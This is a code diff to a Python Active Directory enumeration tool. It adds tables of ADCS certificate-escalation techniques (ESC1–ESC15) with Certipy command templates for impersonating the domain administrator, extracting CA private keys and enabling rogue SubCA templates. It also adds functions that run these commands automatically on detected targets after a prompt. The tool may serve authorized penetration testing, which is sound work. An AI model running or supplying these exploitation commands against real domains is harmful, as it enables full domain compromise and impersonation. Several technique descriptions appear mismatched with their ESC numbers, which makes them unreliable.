@@ -12,6 +12,180 @@ from pathlib import Path
 
 DEBUG = False
 
+ESC_VULNERABILITIES = {
+    "ESC1": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc1",
+        "description": "Allows obtaining an authentication certificate by specifying an arbitrary SAN. Exploitation via Certipy: certipy req -u user@domain -p password -target-ip <dc-ip> -ca <ca-name> -template <template-name> -upn administrator@domain.local"
+    },
+    "ESC2": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc2",
+        "description": "Template can be used for any purpose. Similar exploitation to ESC1 but with more certificate usage possibilities. Can be combined with ESC1 for authentication."
+    },
+    "ESC3": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc3",
+        "description": "Certificate Request Agent EKU allows requesting certificates on behalf of other users. Two-step exploitation: 1) Get agent certificate 2) Request certificate as another user. Command: certipy req -u user@domain -p password -target-ip <dc-ip> -ca <ca-name> -template <vulnerable-template> -on-behalf-of administrator@domain.local"
+    },
+    "ESC4": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc4",
+        "description": "Dangerous permissions on template allowing modification to enable vulnerable features. Exploitation: 1) certipy template -u user@domain -p password -template <template-name> -save-old 2) Modify template 3) Request certificate with new permissions"
+    },
+    "ESC5": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc5",
+        "description": "Enrollment Agent restrictions not enforced. Allows requesting certificates for any user without proper authentication. Command: certipy req -u user@domain -p password -target-ip <dc-ip> -ca <ca-name> -template <vulnerable-template> -on-behalf-of administrator@domain.local"
+    },
+    "ESC6": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc6",
+        "description": "Web Enrollment interface allows specifying arbitrary SAN. Note: Patched after May 2022. Exploitation through Web Enrollment interface or certipy req with -web parameter"
+    },
+    "ESC7": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc7",
+        "description": "Dangerous permissions on CA allowing modification of CA settings. Exploitation: certipy ca -u user@domain -p password -ca <ca-name> -enable-template <template-name> or modify other CA settings"
+    },
+    "ESC8": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc8",
+        "description": "Access to CA backup keys allowing private key reconstruction. Command: certipy ca -u user@domain -p password -ca <ca-name> -backup. Can lead to complete CA compromise"
+    },
+    "ESC9": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc9",
+        "description": "Template with no security extension but allows client authentication. Similar to ESC1 exploitation. Command: certipy req -u user@domain -p password -target-ip <dc-ip> -ca <ca-name> -template <vulnerable-template>"
+    },
+    "ESC10": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc10",
+        "description": "Access to archived certificates issued by the CA. Command: certipy ca -u user@domain -p password -ca <ca-name> -issued. Can reveal sensitive certificate information"
+    },
+    "ESC11": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc11",
+        "description": "ICPR requests not required to be encrypted. Possible interception of certificate requests. Can be exploited by capturing unencrypted certificate requests"
+    },
+    "ESC12": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc12",
+        "description": "Misconfigured certificate templates allowing domain escalation. Check for vulnerable configurations like ENROLLEE_SUPPLIES_SUBJECT and dangerous EKUs"
+    },
+    "ESC13": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc13",
+        "description": "SubCA template enabled allowing creation of subordinate CAs. Can lead to complete AD compromise. Command: certipy req -u user@domain -p password -target-ip <dc-ip> -ca <ca-name> -template SubCA"
+    },
+    "ESC14": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc14",
+        "description": "Vulnerable ACL in Parent-Child CA configuration. Can be exploited to compromise child CAs or escalate privileges"
+    },
+    "ESC15": {
+        "link": "https://www.hackerrecipes.com/ad/movement/certificates/esc15",
+        "description": "Vulnerable template version allowing for template modification attacks. Check for outdated template versions and misconfigurations"
+    }
+}
+
+AUTOMATED_ESC_EXPLOITS = {
+    "ESC1": {
+        "can_automate": True,
+        "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug",
+        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "description": "Request a certificate with alternate UPN (SAN). This allows impersonating any user including Domain Admins.",
+        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
+    },
+    "ESC2": {
+        "can_automate": True,
+        "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug",
+        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "description": "Template allows any purpose. Similar to ESC1 but with more certificate usage possibilities.",
+        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
+    },
+    "ESC3": {
+        "can_automate": True,
+        "command": [
+            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -debug -out cert.pfx",
+            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template User -on-behalf-of 'administrator@{domain}' -pfx cert.pfx -debug"
+        ],
+        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "description": "Certificate Request Agent EKU. Two-step exploitation: 1) Get agent certificate 2) Request certificate as another user.",
+        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
+    },
+    "ESC4": {
+        "can_automate": True,
+        "command": [
+            "certipy template -u '{username}@{domain}' -p '{password}' -template '{template_name}' -save-old -debug",
+            "certipy template -u '{username}@{domain}' -p '{password}' -template '{template_name}' -configuration '{template_name}.json' -save-old -debug",
+            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug"
+        ],
+        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "description": "Dangerous permissions on template. Steps: 1) Save current config 2) Modify template 3) Request certificate.",
+        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
+    },
+    "ESC5": {
+        "can_automate": True,
+        "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -on-behalf-of 'administrator@{domain}' -debug",
+        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "description": "Enrollment Agent restrictions not enforced. Request certificates for any user without proper authentication.",
+        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
+    },
+    "ESC6": {
+        "can_automate": True,
+        "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -web -upn administrator@{domain} -debug",
+        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "description": "Web Enrollment interface allows specifying arbitrary SAN. Note: Only works on unpatched systems (before May 2022).",
+        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
+    },
+    "ESC7": {
+        "can_automate": True,
+        "command": [
+            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -enable-template '{template_name}' -debug",
+            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug"
+        ],
+        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "description": "Dangerous permissions on CA. Enable vulnerable template and request certificate.",
+        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
+    },
+    "ESC8": {
+        "can_automate": True,
+        "command": [
+            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -backup -debug",
+            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -private-key -pfx ca.pfx -password 'Password123!' -debug"
+        ],
+        "requirements": ["username", "password", "ca_name", "domain"],
+        "description": "Access to CA backup keys. Steps: 1) Get CA backup 2) Extract private key. Can lead to complete CA compromise.",
+        "post_exploit": "# With CA private key you can now sign any certificate"
+    },
+    "ESC9": {
+        "can_automate": True,
+        "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug",
+        "requirements": ["username", "password", "dc_ip", "ca_name", "template_name", "domain"],
+        "description": "Template with no security extension but allows client authentication. Similar to ESC1.",
+        "post_exploit": "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
+    },
+    "ESC10": {
+        "can_automate": True,
+        "command": [
+            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -issued -debug",
+            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -issued -id <cert_id> -debug"
+        ],
+        "requirements": ["username", "password", "ca_name", "domain"],
+        "description": "Access to archived certificates. Steps: 1) List issued certs 2) Download specific cert by ID.",
+        "post_exploit": "certipy auth -pfx downloaded.pfx -dc-ip {dc_ip}"
+    },
+    "ESC11": {
+        "can_automate": False,
+        "description": "ICPR requests not required to be encrypted. Requires network interception, cannot be automated directly.",
+        "manual_steps": "Requires setting up a man-in-the-middle position to capture certificate requests."
+    },
+    "ESC13": {
+        "can_automate": True,
+        "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template SubCA -upn administrator@{domain} -debug",
+        "requirements": ["username", "password", "dc_ip", "ca_name", "domain"],
+        "description": "SubCA template enabled. Create a subordinate CA certificate for complete AD compromise.",
+        "post_exploit": "# Use the SubCA certificate to sign new certificates"
+    },
+    "ESC14": {
+        "can_automate": True,
+        "command": [
+            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -list-templates -debug",
+            "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -enable-template SubCA -debug"
+        ],
+        "requirements": ["username", "password", "ca_name", "domain"],
+        "description": "Vulnerable ACL in Parent-Child CA configuration. Enable SubCA template and create rogue CA.",
+        "post_exploit": "# Follow ESC13 steps after enabling SubCA template"
+    }
+}
+
 def get_current_version():
     """Get hash of current script content"""
     try:
@@ -154,8 +328,8 @@ def show_banner():
     text_lines = figlet.renderText('GetInfoAD').rstrip().split('\n')
     for line in text_lines:
         print(colored("║", "cyan") + colored(f"{line:^62}", "green") + colored("║", "cyan"))
-    print(colored("╠══════════════════════════════════════════════════════════════╣", "cyan"))
-    title = "Active Directory Enumeration"
+    print(colored("╠══════════════════════════ V1 ════════════════════════════════╣", "cyan"))
+    title = "Active Directory Enumeration"  
     print(colored("║", "cyan") + colored(f"{title:^62}", "blue", attrs=["bold"]) + colored("║", "cyan"))
     print(colored("╠══════════════════════════════════════════════════════════════╣", "cyan"))
     powered_by = "  [*] Powered by Exegol"
@@ -583,6 +757,157 @@ def ask_crack_hashes():
     except Exception as e:
         print(colored("❌ Unexpected error during hashcat execution:", "red"), e)
 
+def try_exploit_esc(esc_number, ca_name=None, template_name=None):
+    if esc_number == "ESC6":
+        command = "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -upn administrator@{domain} -debug"
+    elif esc_number == "ESC3":
+        command = [
+            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -debug -out cert.pfx",
+            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template User -on-behalf-of 'administrator@{domain}' -pfx cert.pfx -debug"
+        ]
+    elif esc_number == "ESC4":
+        command = [
+            "certipy template -u '{username}@{domain}' -p '{password}' -template '{template_name}' -save-old -debug",
+            "certipy template -u '{username}@{domain}' -p '{password}' -template '{template_name}' -configuration '{template_name}.json' -save-old -debug",
+            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug"
+        ]
+    elif esc_number in AUTOMATED_ESC_EXPLOITS:
+        command = "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug"
+    else:
+        print(colored(f"❌ {esc_number} cannot be automatically exploited.", "red"))
+        return False
+
+    print(colored(f"\n🎯 Attempting to exploit {esc_number}", "cyan"))
+    if esc_number in ESC_VULNERABILITIES:
+        print(colored(f"Description: {ESC_VULNERABILITIES[esc_number]['description']}", "yellow"))
+
+    params = {
+        "username": os.getenv("USER"),
+        "password": os.getenv("PASSWORD"),
+        "dc_ip": os.getenv("DC_IP"),
+        "domain": get_domain_name(),
+        "ca_name": ca_name,
+        "template_name": template_name
+    }
+
+    try:
+        if isinstance(command, list):
+            for cmd in command:
+                print(colored(f"\n🔄 Executing: {cmd.format(**params)}", "cyan"))
+                result = subprocess.run(cmd.format(**params), shell=True, capture_output=True, text=True)
+                print(colored("\nOutput:", "yellow"))
+                print(result.stdout)
+                if result.stderr:
+                    print(colored("\nError:", "red"))
+                    print(result.stderr)
+                if "Successfully requested certificate" in result.stdout or "Successfully updated" in result.stdout:
+                    print(colored("✅ Step completed successfully!", "green"))
+                elif result.returncode != 0:
+                    print(colored("❌ Step failed!", "red"))
+                    return False
+        else:
+            print(colored(f"\n🔄 Executing: {command.format(**params)}", "cyan"))
+            result = subprocess.run(command.format(**params), shell=True, capture_output=True, text=True)
+            print(colored("\nOutput:", "yellow"))
+            print(result.stdout)
+            if "Successfully requested certificate" in result.stdout:
+                print(colored("✅ Exploitation successful!", "green"))
+                return True
+            else:
+                print(colored("❌ Exploitation failed!", "red"))
+                if result.stderr:
+                    print(colored("\nError:", "red"))
+                    print(result.stderr)
+                return False
+
+        return True
+    except Exception as e:
+        print(colored(f"❌ Error during exploitation: {str(e)}", "red"))
+        return False
+
+def process_esc_vulnerabilities(adcs_info):
+    """Process and potentially exploit detected ESC vulnerabilities"""
+    detected_escs = {}
+    current_ca = None
+    current_template = None
+    
+    # Special cases handling
+    special_cases = {
+        "ESC6": {
+            "command": "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -web -upn administrator@{domain} -debug",
+            "requirements": ["username", "password", "dc_ip", "ca_name", "domain"],
+            "description": "Web Enrollment interface allows specifying arbitrary SAN. Note: Only works on unpatched systems (before May 2022)."
+        },
+        "ESC8": {
+            "command": [
+                "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -backup -debug",
+                "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -private-key -pfx ca.pfx -password 'Password123!' -debug"
+            ],
+            "requirements": ["username", "password", "ca_name", "domain"],
+            "description": "Access to CA backup keys. Steps: 1) Get CA backup 2) Extract private key."
+        },
+        "ESC10": {
+            "command": [
+                "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -issued -debug",
+                "certipy ca -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -issued -id <cert_id> -debug"
+            ],
+            "requirements": ["username", "password", "ca_name", "domain"],
+            "description": "Access to archived certificates. Steps: 1) List issued certs 2) Download specific cert by ID."
+        }
+    }
+    
+    for line in adcs_info:
+        if "CA: " in line:
+            current_ca = line.split(": ")[1]
+        elif "Template: " in line:
+            current_template = line.split(": ")[1]
+        elif any(esc in line for esc in AUTOMATED_ESC_EXPLOITS.keys()):
+            esc_num = line.split(":")[0].strip()
+            if esc_num in AUTOMATED_ESC_EXPLOITS:
+                # Vérifier si c'est un cas spécial qui ne nécessite pas de template
+                if esc_num in special_cases:
+                    detected_escs[esc_num] = {
+                        "ca_name": current_ca,
+                        "template_name": None,
+                        "special_case": True,
+                        "exploit_info": special_cases[esc_num]
+                    }
+                # Pour les autres cas, on ne les ajoute que si on a tous les paramètres requis
+                elif current_template and current_ca:
+                    detected_escs[esc_num] = {
+                        "ca_name": current_ca,
+                        "template_name": current_template,
+                        "special_case": False,
+                        "exploit_info": AUTOMATED_ESC_EXPLOITS[esc_num]
+                    }
+    
+    if detected_escs:
+        print(colored("\n🔍 Detected ESC vulnerabilities that can be automatically exploited:", "cyan"))
+        for esc_num, info in detected_escs.items():
+            # Vérifier si nous avons tous les paramètres requis
+            params = {
+                "username": os.getenv("USER"),
+                "password": os.getenv("PASSWORD"),
+                "dc_ip": os.getenv("DC_IP"),
+                "domain": get_domain_name(),
+                "ca_name": info["ca_name"],
+                "template_name": info["template_name"]
+            }
+            
+            requirements = info["exploit_info"]["requirements"]
+            missing_params = [req for req in requirements if not params.get(req)]
+            
+            # Ne proposer l'exploitation que si nous avons tous les paramètres requis
+            if not missing_params:
+                print(colored(f"\n• {esc_num}", "yellow"))
+                print(f"  CA: {info['ca_name']}")
+                if info["template_name"]:
+                    print(f"  Template: {info['template_name']}")
+                
+                choice = input(colored(f"\n🎯 Would you like to attempt exploitation of {esc_num}? (y/N) > ", "cyan")).strip().lower()
+                if choice == 'y':
+                    try_exploit_esc(esc_num, info["ca_name"], info["template_name"])
+
 def get_adcs_info():
     """Enumerate ADCS certificates using Certipy"""
     username = os.getenv("USER")
@@ -620,89 +945,100 @@ def get_adcs_info():
                 
                 if line == "Certificate Authorities":
                     current_section = "CA"
-                    vulns.append("\n[Certificate Authorities]")
+                    vulns.append("_[Certificate Authorities]_")
                     continue
                 elif line == "Certificate Templates":
                     current_section = "Templates"
-                    vulns.append("\n[Certificate Templates]")
+                    vulns.append("\n_[Certificate Templates]_")
                     continue
                 
                 if current_section == "CA":
                     if "CA Name" in line:
-                        vulns.append(f"\n  CA: {line.split(': ')[1]}")
+                        vulns.append(f"CA: {line.split(': ')[1]}")
                     elif "DNS Name" in line:
-                        vulns.append(f"  DNS: {line.split(': ')[1]}")
+                        vulns.append(f"DNS: {line.split(': ')[1]}")
                     elif "Certificate Subject" in line:
-                        vulns.append(f"  Subject: {line.split(': ')[1]}")
+                        vulns.append(f"Subject: {line.split(': ')[1]}")
                     elif "Web Enrollment" in line:
-                        vulns.append(f"  Web Enrollment: {line.split(': ')[1]}")
+                        vulns.append(f"Web Enrollment: {line.split(': ')[1]}")
                     elif "User Specified SAN" in line:
-                        vulns.append(f"  User Specified SAN: {line.split(': ')[1]}")
+                        vulns.append(f"User Specified SAN: {line.split(': ')[1]}")
                     elif "Permissions" in line:
-                        vulns.append("\n  [Permissions]")
+                        vulns.append("\n_[Permissions]_")
                     elif "Access Rights" in line:
-                        vulns.append("    Access Rights:")
+                        vulns.append("Access Rights:")
                         seen_users.clear()
                     elif line.startswith("LAB.LOCAL\\"):
                         if line not in seen_users:
-                            vulns.append(f"      • {line}")
+                            vulns.append(f"• {line}")
                             seen_users.add(line)
                     elif line.startswith("[!] Vulnerabilities"):
-                        vulns.append("\n  [Vulnerabilities]")
+                        vulns.append("\n_[Vulnerabilities]_")
                     elif any(esc in line for esc in ["ESC1", "ESC2", "ESC3", "ESC4", "ESC5", "ESC6", "ESC7", "ESC8", "ESC9", "ESC10", "ESC11"]):
                         if ": " in line:
                             esc_num, desc = line.split(": ", 1)
                             esc_num = esc_num.strip()
                             desc = desc.strip()
-                            vulns.append(f"    {esc_num:<8} : {desc}")
+                            vulns.append(f"{esc_num}: {desc}")
+                            # Ajout des informations de Hacker Recipes
+                            if esc_num in ESC_VULNERABILITIES:
+                                esc_info = ESC_VULNERABILITIES[esc_num]
+                                vulns.append(f"📖 Documentation: {esc_info['link']}")
+                                vulns.append(f"💡 Exploitation: {esc_info['description']}")
                 
                 elif current_section == "Templates":
                     if "Template Name" in line:
                         current_template = line.split(": ")[1]
-                        vulns.append(f"\n  Template: {current_template}")
+                        vulns.append(f"\nTemplate: {current_template}")
                         seen_users.clear()
                     elif "Display Name" in line:
-                        vulns.append(f"    Name: {line.split(': ')[1]}")
+                        vulns.append(f"Name: {line.split(': ')[1]}")
                     elif "Enabled" in line and ": True" in line:
-                        vulns.append("    Status: Enabled")
+                        vulns.append("Status: Enabled")
                     elif "Client Authentication" in line:
-                        vulns.append(f"    Client Auth: {line.split(': ')[1]}")
+                        vulns.append(f"Client Auth: {line.split(': ')[1]}")
                     elif "Enrollment Flag" in line and ":" in line:
                         flags = line.split(":", 1)[1].strip()
                         if flags:
-                            vulns.append("\n    [Enrollment Flags]")
+                            vulns.append("_[Enrollment Flags]_")
                             for flag in flags.split():
-                                vulns.append(f"      • {flag}")
+                                vulns.append(f"• {flag}")
                     elif "Private Key Flag" in line and ":" in line:
                         flags = line.split(":", 1)[1].strip()
                         if flags:
-                            vulns.append("\n    [Private Key Flags]")
+                            vulns.append("_[Private Key Flags]_")
                             for flag in flags.split():
-                                vulns.append(f"      • {flag}")
+                                vulns.append(f"• {flag}")
                     elif "Extended Key Usage" in line and ":" in line:
                         usage = line.split(":", 1)[1].strip()
                         if usage:
-                            vulns.append("\n    [Extended Key Usage]")
+                            vulns.append("_[Extended Key Usage]_")
                             for use in usage.split(","):
-                                vulns.append(f"      • {use.strip()}")
+                                vulns.append(f"• {use.strip()}")
                     elif "Enrollment Rights" in line:
-                        vulns.append("\n    [Enrollment Rights]")
+                        vulns.append("_[Enrollment Rights]_")
                         seen_users.clear()
                     elif line.startswith("LAB.LOCAL\\"):
                         if line not in seen_users:
-                            vulns.append(f"      • {line}")
+                            vulns.append(f"• {line}")
                             seen_users.add(line)
                     elif line.startswith("[!] Vulnerabilities"):
-                        vulns.append("\n    [Vulnerabilities]")
+                        vulns.append("\n_[Vulnerabilities]_")
                     elif any(esc in line for esc in ["ESC1", "ESC2", "ESC3", "ESC4", "ESC5", "ESC6", "ESC7", "ESC8", "ESC9", "ESC10", "ESC11"]):
                         if ": " in line:
                             esc_num, desc = line.split(": ", 1)
                             esc_num = esc_num.strip()
                             desc = desc.strip()
-                            vulns.append(f"      {esc_num:<8} : {desc}")
+                            vulns.append(f"{esc_num}: {desc}")
+                            # Ajout des informations de Hacker Recipes
+                            if esc_num in ESC_VULNERABILITIES:
+                                esc_info = ESC_VULNERABILITIES[esc_num]
+                                vulns.append(f"📖 Documentation: {esc_info['link']}")
+                                vulns.append(f"💡 Exploitation: {esc_info['description']}")
         
-        if not vulns:
-            vulns.append("No ADCS vulnerabilities found.")
+        if vulns:
+            # Process detected vulnerabilities for potential exploitation
+            process_esc_vulnerabilities(vulns)
         
         return vulns
     except subprocess.CalledProcessError as e:
@@ -809,16 +1145,66 @@ def full_report():
         md.extend(passpol)
         md.append("```\n")
 
-    # Add ADCS section before AS-REP Roasting
-    md.append("## 🔏 ADCS Enumeration\n```")
     if adcs_vulns:
+        md.append("## 🔏 ADCS Enumeration")
+        current_section = None
+        in_code_block = False
+        
         for line in adcs_vulns:
-            # Remove color codes for markdown output
-            clean_line = re.sub(r'\x1b\[[0-9;]*m', '', line)
-            md.append(clean_line)
+            # Si c'est une nouvelle section principale (CA ou Templates)
+            if line.startswith("_[") and any(x in line for x in ["Certificate Authorities", "Certificate Templates"]):
+                if in_code_block:
+                    md.append("```\n")
+                    in_code_block = False
+                
+                section_name = line.strip("_[]")
+                md.append(f"\n### {section_name}\n")
+                current_section = section_name.split()[0]
+                
+            # Si c'est un nouveau template
+            elif line.startswith("Template:"):
+                if in_code_block:
+                    md.append("```\n")
+                    in_code_block = False
+                
+                template_name = line.split(": ")[1]
+                md.append(f"\n#### {template_name}")
+                md.append("```")
+                in_code_block = True
+                
+            # Si c'est une sous-section d'un template
+            elif line.startswith("_[") and any(x in line for x in ["Enrollment Flags", "Private Key Flags", "Extended Key Usage", "Enrollment Rights", "Vulnerabilities"]):
+                if in_code_block:
+                    md.append("```\n")
+                    in_code_block = False
+                
+                subsection_name = line.strip("_[]")
+                md.append(f"\n**{subsection_name}**")
+                md.append("```")
+                in_code_block = True
+                
+            # Si c'est un lien de documentation ou une exploitation
+            elif line.startswith("📖 Documentation:") or line.startswith("💡 Exploitation:"):
+                if in_code_block:
+                    md.append("```")
+                    in_code_block = False
+                md.append(f"\n{line}")
+                if line.startswith("💡"):
+                    md.append("\n```")
+                    in_code_block = True
+            
+            # Pour toutes les autres lignes
+            else:
+                if not in_code_block:
+                    md.append("```")
+                    in_code_block = True
+                md.append(line)
+        
+        # Fermer le dernier bloc de code si nécessaire
+        if in_code_block:
+            md.append("```\n")
     else:
-        md.append("No ADCS information available")
-    md.append("```\n")
+        md.append("## 🔏 ADCS Enumeration\n```\nNo ADCS vulnerabilities found.\n```\n")
 
     md.append("## 🔥 AS-REP Roasting\n```")
     if asreproast:
@@ -867,6 +1253,29 @@ def full_report():
 
     ask_to_save(markdown_output.splitlines(), filename)
 
+def update_hosts_file():
+    dc_ip = os.getenv("DC_IP")
+    domain = get_domain_name()
+    
+    if not dc_ip or not domain:
+        return
+    
+    hosts_entry = f"{dc_ip} {domain}"
+    
+    try:
+        with open('/etc/hosts', 'r') as f:
+            if any(line.strip() == hosts_entry for line in f):
+                return
+        
+        command = f'echo "{hosts_entry}" | sudo tee -a /etc/hosts > /dev/null'
+        subprocess.run(command, shell=True, check=True)
+        print(colored(f"✅ Added : {hosts_entry} to /etc/hosts", "green"))
+        
+    except subprocess.CalledProcessError:
+        print(colored("❌ Failed to update /etc/hosts (permission denied)", "red"))
+    except Exception as e:
+        print(colored(f"❌ Error updating /etc/hosts: {str(e)}", "red"))
+
 def main():
     parser = argparse.ArgumentParser(description="Active Directory enumeration via SMB")
     group = parser.add_mutually_exclusive_group()
@@ -897,6 +1306,8 @@ def main():
         print(colored("💡 Please define all required environment variables before running this script.", "yellow", attrs=["bold"]))
         print(colored("Example: exegol-history add creds -u 'MyUser' -p 'Password123' ; exegol-history apply creds", "cyan"))
         sys.exit(1)
+    
+    update_hosts_file()
 
     if DEBUG:
         print(colored("🔧 Debug mode enabled - Displaying all commands and outputs", "yellow", attrs=["bold"]))
